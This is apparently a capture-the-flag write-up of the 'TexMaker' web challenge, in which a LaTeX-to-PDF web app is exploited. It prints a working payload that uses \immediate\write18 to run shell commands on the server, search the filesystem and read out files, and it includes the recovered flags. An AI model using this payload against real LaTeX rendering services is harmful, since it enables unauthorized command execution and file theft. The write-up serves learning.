`IW{S.E` + `.R.V.E` + `.R>=F:` + `A:R:M}`
```
IW{S.E.R.V.E.R>=F:A:R:M}
```



### File: writeups/internetwache2016/texmaker.md

# TexMaker
*(web90, solved by 193)*
> Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for 
creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any 
flaws.

On this challenge website, you're presented with a web app that parses LaTeX into a PDF, and returns that 
PDF to you. Essentially it's a web wrapper around the CLI `pdftex`. We already have code running on a 
machine, and the challenge creators were kind enough to provide us with a print of the stdout.

I've only used LaTeX once before (recently for a paper I submitted to a conference), so I'm fairly knew, 
but gained a lot of exposure to it. From experience, I know LaTeX is powerful, and can include other files 
inside of files, i.e. include a fragment `.tex` file inside of a parent .tex. So, let's Google for [how to 
include a file](http://tex.stackexchange.com/questions/2375/file-input-and-output). It took a lot of 
wrestling around in LaTeX, but I was finally able to get LaTeX to read an entire file line by line into a 
PDF, and export that PDF to me.

I decided I need to find a way to execute commands from LaTeX, to get a file listing, to find out where a 
flag file is. It turns out there's the `\immediate\write18{ls xyz.* > temp.dat}` construct in LaTeX. 
`write18` is a function that is essentially `system("...")` for LaTeX. We can do a `find / -name "*flag*"` 
and find any files named flag on the file system.

```
\immediate\write18{find / -name "*flag*" > hihi}
\openin5=hihi
\makeatletter
\newread\myread
\newcount\linecnt
\openin\myread=hihi
\@whilesw\unless\ifeof\myread\fi{%
  \advance\linecnt by \@ne
  \readline\myread to \line
  \line
}
\makeatother
\closein5
```
> Please excuse the shitty LaTeX that probably makes no sense, but this seemed to work mostly.

This returned nothing. Okay, perhaps the flag is stored in a random file. Let's change our system command 
to search every file for the string 'IW' (the flag format), `ls -R / | grep 'IW'`, and see what we get.
This returns a giant PDF with a bunch of junk. Doing a search using a PDF editor for "flag" reveals:
```
matchesfl/var/www/texmaker.ctf.internetwache.org/flag.php:$FLAG = ”IW–L4T3x ̇IS ̇Tur1ng ̇c0mpl3t
```

Weirdly formatted, but with some knowledge of other flags, I'm able to guess the actual flag is meant to be 
`IW{L4T3x_IS_Tur1ng_c0mpl3te}`.


